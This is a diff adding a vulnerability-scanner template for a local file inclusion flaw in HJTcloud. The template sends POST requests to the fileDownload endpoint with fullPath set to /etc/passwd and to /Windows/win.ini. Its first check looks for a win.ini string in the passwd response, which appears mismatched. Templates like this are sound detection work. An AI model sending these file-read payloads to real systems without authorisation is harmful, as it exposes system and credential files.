@@ -1,0 +1,42 @@
+id: hjtcloud-arbitrary-file-read
+brief:
+    title: HJTcloud - Local File Inclusion
+    by: pikpikcu
+    level: high
+    about: HJTcloud is vulnerable to local file inclusion.
+    label:
+        - hjtcloud
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/fileDownload?action=downloadBackupFile'
+      head:
+        Accept: application/json, text/plain, */*
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      body: fullPath=/etc/passwd
+      signs:
+        - "on": word
+          has:
+            - bit app support
+          in: body
+        - "on": status
+          status:
+            - 200
+    - verb: POST
+      to:
+        - '{{BaseURL}}/fileDownload?action=downloadBackupFile'
+      head:
+        Accept: application/json, text/plain, */*
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      body: fullPath=/Windows/win.ini
+      signs:
+        - "on": word
+          has:
+            - bit app support
+          in: body
+        - "on": status
+          status:
+            - 200
